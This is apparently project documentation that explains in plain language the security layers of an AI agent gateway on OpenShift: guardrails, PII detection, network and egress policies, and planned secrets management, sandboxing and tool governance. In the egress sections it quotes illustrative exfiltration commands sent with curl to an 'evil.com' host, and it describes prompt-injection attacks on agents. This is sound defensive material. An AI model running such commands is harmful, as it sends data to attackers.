# How Each Security Layer Works

This document explains each security layer in plain language — what problem it solves, how it works in practice, and how it makes OpenClaw more secure. For configuration details and YAML specs, see the linked technical docs.

## NeMo Guardrails

Without guardrails, every message a user sends goes straight to the LLM. If someone types a prompt injection — a carefully worded message designed to make the AI ignore its instructions, leak system prompts, or produce harmful content — the model just processes it. There is nothing in the way.

NeMo Guardrails sits between the user and the LLM as a sidecar container inside the OpenClaw pod. Every incoming message hits the guardrails proxy first, before it ever reaches the model. The proxy uses the LLM itself to evaluate whether the message is safe — it asks the model "does this message violate any of these safety policies?" If the answer is yes, the message is blocked immediately and the user gets a refusal response. The actual LLM is never called, so there is no chance of it being manipulated by the unsafe input.

The same check happens on the way out. After the LLM generates a response, NeMo Guardrails evaluates the output before it reaches the user. If the model somehow produced something that violates the safety policies — personal information, harmful instructions, leaked system context — the output is blocked and replaced with a safe refusal.

The security improvement is straightforward: without this layer, the LLM sees everything and says everything. With it, unsafe content is caught at the door and never reaches the model, and unsafe responses are caught on the way out and never reach the user.

**Technical details:** [NeMo Guardrails](nemo-guardrails.md)

## TrustyAI GuardrailsOrchestrator

NeMo Guardrails uses the LLM to judge safety, which means it relies on the model's own judgment. TrustyAI provides a second, independent safety check using purpose-built detectors that don't depend on the LLM at all.

The GuardrailsOrchestrator runs as a separate pod managed by the TrustyAI operator. When the OpenClaw gateway receives a message, it sends it to the orchestrator for content analysis. The orchestrator runs the message through its detectors — including a built-in PII detector that scans text for personal information like email addresses, social security numbers, credit card numbers, and phone numbers. These detectors use pattern matching and text analysis, not LLM inference, so they are deterministic and fast.

This matters because LLM-based safety checks are probabilistic. NeMo Guardrails might miss a cleverly disguised prompt injection or fail to catch PII embedded in a long message. TrustyAI's detectors use different techniques (pattern matching, named entity recognition) and catch things the LLM-based check might miss. Having both means an attack has to evade two completely different detection methods.

The orchestrator also provides a centralized point for adding new detectors in the future. When Red Hat adds new content safety classifiers to TrustyAI, they can be enabled through configuration without changing OpenClaw's code or deployment.

**Technical details:** [TrustyAI Orchestrator](trustyai-orchestrator.md)

## Presidio PII Detection

Before TrustyAI's built-in PII detector existed, we deployed Microsoft's Presidio as standalone pods to handle PII detection. Presidio ran two containers — an Analyzer that detected PII entities in text, and an Anonymizer that could redact or replace them. These were integrated into the LLM request pipeline through LiteLLM's guardrail hooks: every request and response passed through Presidio before continuing.

Presidio worked, but it added two extra pods to maintain and introduced a network dependency — the LiteLLM proxy had to reach the Presidio pods over the network for every request. When TrustyAI's built-in detector became available, it provided the same PII detection capability without the extra pods, because it runs inside the guardrails orchestrator that was already deployed.

We kept the Presidio documentation as a reference because it demonstrates a different integration pattern (LiteLLM hooks vs. orchestrator detectors) and because Presidio supports more fine-grained entity type configuration. If a future use case needs entity-level control that TrustyAI's built-in detector doesn't support, Presidio can be redeployed alongside it.

**Technical details:** [Presidio PII Detection](presidio-pii-detection.md)

## NetworkPolicies (Ingress Isolation)

By default, OpenShift allows any pod to talk to any other pod in the same namespace, and the router delivers external traffic to any pod that has a Route. This means the guardrails orchestrator, the NeMo Guardrails server, and any other internal service are all directly reachable from the public internet through their Routes. Someone could call the guardrails service directly, bypassing the OpenClaw gateway entirely — skipping authentication, skipping the OAuth proxy, and interacting with internal services that were never meant to be public.

NetworkPolicies fix this by flipping the default. We apply a default-deny-ingress policy that blocks all incoming traffic to every pod in the namespace. Nothing can reach anything. Then we carve out exactly three exceptions: the OpenShift router can reach the OpenClaw pod (so the public route works), the OpenClaw pod can reach the guardrails orchestrator (so content safety checks work), and the OpenClaw pod can reach the NeMo Guardrails pod (so inference guardrails work).

The result is that the only way into the system from the outside is through the OpenClaw gateway, which enforces OAuth authentication. The guardrails services still have Routes in OpenShift, but the NetworkPolicies prevent the router from actually delivering traffic to those pods. If you try to hit the guardrails route from a browser, you get a 503 — the connection is refused at the network level.

This reduces the attack surface to a single entry point. An attacker can't probe internal services, can't bypass authentication by calling guardrails directly, and can't discover or interact with any pod that isn't explicitly exposed.

**Technical details:** [Network Policies](network-policies.md)

## AdminNetworkPolicy (Egress Control)

NetworkPolicies handle who can talk *to* the pods. AdminNetworkPolicy handles where the pods can talk *out to*. This is the other direction — controlling what the OpenClaw pod is allowed to connect to.

Without egress control, a compromised pod can make outbound connections to anywhere on the internet. If an attacker gets code execution inside the OpenClaw pod — through a prompt injection that triggers a tool call, or through a vulnerability in one of the sidecars — they could exfiltrate data to any external server, download malware, or establish a reverse shell. The pod has network access to the entire internet.

The AdminNetworkPolicy locks this down. It says the OpenClaw pod can only make outbound connections on specific ports to specific destinations: DNS servers for name resolution, the Kubernetes API for cluster operations, the guardrails orchestrator on its service ports, and HTTPS (port 443) to external hosts. Everything else — HTTP, SSH, arbitrary TCP connections — is denied. If an attacker gets code execution and tries to `curl http://evil.com:8080/exfil`, the connection is blocked at the network level.

The critical distinction from regular NetworkPolicies is that AdminNetworkPolicies are cluster-scoped and admin-controlled. A namespace user cannot modify or delete them. Even if someone with namespace access deletes every NetworkPolicy, the AdminNetworkPolicy still enforces its rules. This is enforced by the cluster administrators through ArgoCD, and namespace users cannot circumvent it.

**Technical details:** [Admin Network Policy](admin-network-policy.md)

## EgressFirewall (Domain Filtering)

The AdminNetworkPolicy allows the OpenClaw pod to make HTTPS connections (port 443) to any IP address. This is necessary because the pod needs to reach Vertex AI, Google OAuth, and GitHub. But "any IP on port 443" is still a very broad permission — an attacker could exfiltrate data to any HTTPS server on the internet.

The EgressFirewall adds a second layer of filtering on top of the AdminNetworkPolicy. Even though port 443 is open, the EgressFirewall restricts *which domains* can be reached. Only five specific hostnames are allowed: `oauth2.googleapis.com`, `us-east5-aiplatform.googleapis.com`, `accounts.google.com`, `github.com`, and `api.github.com`. Any HTTPS connection to a hostname not on this list is blocked.

Both controls must allow the traffic for it to succeed. The AdminNetworkPolicy checks "is this the right port?" and the EgressFirewall checks "is this the right domain?" An attacker who gets code execution and tries to `curl https://evil.com/exfil` passes the AdminNetworkPolicy check (port 443 is allowed) but fails the EgressFirewall check (`evil.com` is not on the allowlist). The connection is dropped.

This is defense in depth — two independent systems checking different things. If one has a misconfiguration, the other still blocks the attack. The EgressFirewall is also namespace-wide, meaning it applies to every pod in the namespace, not just the ones labeled `app: openclaw`. Even pods that the AdminNetworkPolicy doesn't target are still restricted by the domain allowlist.

**Technical details:** [Egress Firewall](egress-firewall.md)

## HashiCorp Vault (Secrets Management) — Planned

OpenClaw currently stores secrets — the LiteLLM master key, GCP credentials, the gateway token — as Kubernetes Secrets. These are base64-encoded, not encrypted. Anyone with read access to the namespace can run `oc get secret -o yaml` and decode them. There is no record of who accessed a secret or when, and secrets never expire or rotate automatically.

Vault acts as a locked safe inside the cluster. Instead of secrets sitting in etcd as base64 text, they live inside Vault, encrypted and access-controlled. When the OpenClaw pod starts up, it proves its identity to Vault by presenting its Kubernetes service account token. Vault verifies this with the Kubernetes API — no passwords are exchanged. Once Vault trusts the pod, it hands over only the specific secrets that pod is allowed to access, based on policies.

The secrets are injected directly into the pod's memory by a Vault Agent sidecar. They never get written as a Kubernetes Secret in etcd, so there is nothing for someone with `oc get secret` access to find. For GCP credentials, Vault can generate short-lived service account keys on demand — the key expires after an hour, so if it is stolen, it is useless after the TTL runs out. There is no permanent credential to compromise.

Every access is logged. Vault's audit device records which pod requested which secret, when, and whether the request was allowed or denied. This gives you a forensic trail that plain Kubernetes Secrets simply do not provide.

**Technical details:** [Future Work — HashiCorp Vault](future-work.md#1-hashicorp-vault----secrets-management-high-priority)

## NVIDIA OpenShell (Agent Sandboxing) — Planned

When AI agents execute tool calls — running code, accessing files, making API requests — that code runs with the same permissions as the agent process itself. If an agent is tricked into running malicious code through a prompt injection, that code has full access to everything the agent can reach: the filesystem, the network, other pods, and credentials in memory.

OpenShell provides kernel-level sandboxing for each agent session. Instead of all agents sharing the same process space, each agent or agent session runs inside its own isolated sandbox with its own filesystem and network restrictions. A compromised agent can only damage its own sandbox — it cannot read files from other sessions, make unauthorized network calls, or interfere with the gateway.

The intended architecture is per-session isolation: the OpenClaw gateway runs in a VM or rootless container as its own user, and each agent session spawns into a separate OpenShell sandbox. This is implemented via the OpenClaw OpenShell-sandbox plugin, not by wrapping the entire OpenClaw deployment in a single sandbox. Running everything in one sandbox would mean a single compromise affects the gateway, all sessions, and all credentials — which defeats the purpose.

On OpenShift, this is deployed via the claw-operator, which handles sandbox lifecycle management. The main constraint is that OpenShell requires the privileged SCC to install its kernel-level hooks, which needs cluster administrator approval.

**Technical details:** [Future Work — NVIDIA OpenShell](future-work.md#2-nvidia-openshell----sandboxed-agent-runtime-medium-priority)

## MCP Gateway (Tool Governance) — Planned

The Model Context Protocol (MCP) defines how agents discover and use tools. Without governance, any agent can call any tool that is available on the MCP server. If an agent has access to a tool that deletes files, reads sensitive data, or makes external API calls, there is nothing preventing it from using those tools — even if it was only supposed to use a specific subset.

MCP Gateway is an Envoy-based proxy that sits between agents and MCP tool servers. When an agent tries to call a tool, the request goes through the gateway first. The gateway checks the agent's identity (via its authentication token) and decides whether that specific agent is allowed to use that specific tool. Different agents can have different tool permissions — a code review agent might only have read access to repositories, while a deployment agent has write access but no access to user data tools.

The gateway also handles credential scoping. Instead of the agent presenting its own credentials to the tool server, the gateway exchanges the agent's token for a scoped, per-backend token with minimum necessary permissions. The tool server never sees the agent's original credentials, and the agent never sees the tool server's credentials.

This prevents both accidental and malicious tool misuse. An agent that has been prompt-injected cannot escalate its privileges by calling tools it was not authorized to use, because the gateway enforces the authorization boundary at the network level, not in the agent's code.

**Technical details:** [Future Work — MCP Gateway](future-work.md#3-mcp-gateway----tool-governance-medium-priority)
